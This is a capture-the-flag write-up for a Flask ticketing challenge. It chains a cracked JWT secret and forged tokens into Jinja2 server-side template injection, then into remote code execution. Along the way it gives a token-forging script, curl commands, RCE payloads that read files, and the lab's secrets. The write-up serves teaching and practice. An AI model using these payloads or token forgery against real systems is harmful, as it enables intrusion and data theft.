---
title: Esh Sewa - SSTI to RCE
---

## Target
- URL: `https://h0dv95z096p6.ctfhub.io` (your instance URL will differ)
- Stack: nginx 1.28 + Flask/Werkzeug, Python 3.9, Jinja2

## TL;DR Attack Chain
Register -> Crack JWT secret -> Forge KYC-verified JWT -> Update username to SSTI payload -> Purchase ticket -> View ticket (Owner field renders SSTI) -> RCE

---

## Step 1: Register an Account

```bash
curl -s -D - "https://<YOUR_HOST>/register" -d 'username=myuser&password=mypass'
```

You should get a 302 redirect to `/login` with flash "Registration successful!"

## Step 2: Login and Get JWT

```bash
curl -s -D - "https://<YOUR_HOST>/login" -d 'username=myuser&password=mypass'
```

Look at the `Set-Cookie: auth_token=eyJ...` header. That's your JWT.

## Step 3: Crack the JWT Secret

Copy your JWT and crack it with hashcat:

```bash
echo 'eyJ...<your full JWT>' > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

The secret is `cybernepal` (HS256).

## Step 4: Forge a KYC-Verified JWT

The app gates ticket features behind `is_kyc_verified: true` in the JWT. Since we know the signing secret, we forge it.

Save this as `forge_jwt.py`:

```python
import hmac, hashlib, base64, json, time, sys

secret = 'cybernepal'
username = sys.argv[1] if len(sys.argv) > 1 else 'myuser'

header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {
    'username': username,
    'is_kyc_verified': True,
    'exp': int(time.time()) + 86400
}

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

h = b64url(header)
p = b64url(payload)
sig = hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'{h}.{p}.{s}')
```

```bash
# Forge KYC JWT for your user
KYC_JWT=$(python3 forge_jwt.py myuser)
echo $KYC_JWT
```

## Step 5: Confirm SSTI - Update Username to `{{7*7}}`

The trick: your username gets reflected in multiple places, but only ONE of them renders Jinja2 templates -- the **Owner** field on `/view_ticket/<id>`.

```bash
# Update username to SSTI test payload
curl -s -D - "https://<YOUR_HOST>/update_username" -b "auth_token=$KYC_JWT" --data-urlencode 'new_username={{7*7}}'
```

You'll get a 302 with a new JWT in `Set-Cookie`. The username is now `{{7*7}}`.

## Step 6: Forge KYC JWT with SSTI Username

The server resets `is_kyc_verified` to false in the new JWT. Forge it again:

```bash
SSTI_JWT=$(python3 forge_jwt.py '{{7*7}}')
```

## Step 7: Purchase a Ticket

Tickets require KYC -- that's why we forged it:

```bash
curl -s -D - "https://<YOUR_HOST>/purchase_ticket" -b "auth_token=$SSTI_JWT" -d 'ticket_type=Movie&amount=100'
```

302 redirect to `/tickets`.

## Step 8: View the Ticket - SSTI Fires Here

Check your tickets to get the ticket ID:

```bash
curl -s "https://<YOUR_HOST>/tickets" -b "auth_token=$SSTI_JWT"
```

Find the `/view_ticket/<id>` link. Then view it:

```bash
curl -s "https://<YOUR_HOST>/view_ticket/1" -b "auth_token=$SSTI_JWT"
```

Look at the HTML. You'll see TWO reflection points:
- `<h2>{{7*7}}</h2>` -- LITERAL (safe template variable, autoescaped)
- `<p class="font-semibold">49</p>` under "Owner" -- **RENDERED! SSTI confirmed!**

The `<h2>` uses `{{ ticket_type }}` (safe). The Owner field uses `render_template_string()` with the username concatenated in -- that's the vuln.

## Step 9: RCE - Update Username to OS Command

Now that you've confirmed SSTI, escalate to RCE:

```bash
# Register a NEW account (can't reuse username {{7*7}})
curl -s "https://<YOUR_HOST>/register" -d 'username=rceuser&password=rceuser'

# Forge KYC JWT
RCE_JWT=$(python3 forge_jwt.py rceuser)

# Update username to Jinja2 RCE payload
curl -s -D - "https://<YOUR_HOST>/update_username" -b "auth_token=$RCE_JWT" --data-urlencode 'new_username={{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}'
```

Capture the new JWT from `Set-Cookie`, decode the username, and forge KYC again:

```bash
# Decode the new JWT to get the exact username stored
# (copy the auth_token value from the Set-Cookie header)
python3 -c "
import base64, json
jwt = '<PASTE_NEW_JWT_HERE>'
payload = jwt.split('.')[1]
payload += '=' * (4 - len(payload) % 4)
data = json.loads(base64.urlsafe_b64decode(payload))
print(data['username'])
"

# Forge KYC with the exact SSTI username
SSTI_RCE_JWT=$(python3 forge_jwt.py '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}')
```

Then purchase a ticket and view it:

```bash
# Purchase ticket
curl -s "https://<YOUR_HOST>/purchase_ticket" -b "auth_token=$SSTI_RCE_JWT" -d 'ticket_type=x&amount=100'

# Get ticket ID
curl -s "https://h0dv95z096p6.ctfhub.io/tickets" -b "auth_token=$SSTI_RCE_JWT" | grep view_ticket

# View ticket -- RCE output appears in Owner field
curl -s "https://h0dv95z096p6.ctfhub.io/view_ticket/<ID>" -b "auth_token=$SSTI_RCE_JWT"
```

You should see in the Owner field:
```
uid=1000(balenshah) gid=1000(balenshah) groups=1000(balenshah)
```

## Step 10: Find the Flag

Each new command needs a NEW account (username must be unique). Repeat step 9 with:

```bash
cat /home/balenshah/.ash_history
```

The shell history reveals a breadcrumb:
```
cat /var/lib/esh-sewa/.secrets/s3cr377.txt
```

Run that command via SSTI (new account, same chain):

```bash
# Register
curl -s "https://<YOUR_HOST>/register" -d 'username=flaguser&password=flaguser'

# Forge KYC
FLAG_JWT=$(python3 forge_jwt.py flaguser)

# Update username to cat the flag
curl -s "https://<YOUR_HOST>/update_username" -b "auth_token=$FLAG_JWT" --data-urlencode 'new_username={{self.__init__.__globals__.__builtins__.__import__("os").popen("cat /var/lib/esh-sewa/.secrets/s3cr377.txt").read()}}'

# Forge JWT with SSTI username
FLAG_JWT2=$(python3 forge_jwt.py '{{self.__init__.__globals__.__builtins__.__import__("os").popen("cat /var/lib/esh-sewa/.secrets/s3cr377.txt").read()}}')

# Buy ticket + view
curl -s "https://<YOUR_HOST>/purchase_ticket" -b "auth_token=$FLAG_JWT2" -d 'ticket_type=x&amount=100'
curl -s "https://<YOUR_HOST>/tickets" -b "auth_token=$FLAG_JWT2" | grep view_ticket
curl -s "https://<YOUR_HOST>/view_ticket/<ID>" -b "auth_token=$FLAG_JWT2" | grep -A1 Owner
```

**Flag:** `flag{Your flag here}`

**Note**: the container has `iptables -P OUTPUT DROP` so no reverse shells. All exfiltration is through the SSTI output in the Owner field.

---

## Why This Works

The vulnerable code in `app.py` (lines 402-424):

```python
@app.route('/view_ticket/<int:ticket_id>')
@kyc_required
def view_ticket(ticket_id):
    token = request.cookies.get('auth_token')
    user = verify_jwt(token)
    username = user['username']

    if ticket_id not in tickets_db:
        flash('Ticket not found', 'error')
        return redirect(url_for('tickets'))

    ticket = tickets_db[ticket_id]
    if ticket['owner'] != username:
        flash('You are not authorized to view this ticket', 'error')
        return redirect(url_for('tickets'))

    owner_raw = ticket['owner']
    owner_rendered = render_template_string(owner_raw)  # <-- VULNERABLE LINE 419

    return render_template('view_ticket.html',
                         ticket=ticket,
                         username=username,
                         owner=owner_rendered)
```

- Line 419: `render_template_string(owner_raw)` passes the raw username directly into the Jinja2 template engine. 
- The username (which we control via `/update_username`) gets evaluated as a Jinja2 expression.

- Meanwhile, every other reflection point passes the username as a template variable (`{{ username }}`), which Jinja2 autoescapes - rendering it literally.

- The lesson: just because input renders literally in one place doesn't mean it's safe everywhere. Check EVERY reflection point.

## Key Credentials
- JWT signing secret (HS256): `cybernepal`
- Flask SECRET_KEY: `d81bcf3df0ee54ceecce599707503a1adf8cac94b31fde1d2da3813793138d7a`
- App runs as: `balenshah` (uid 1000)
- No outbound network (iptables DROP on OUTPUT)
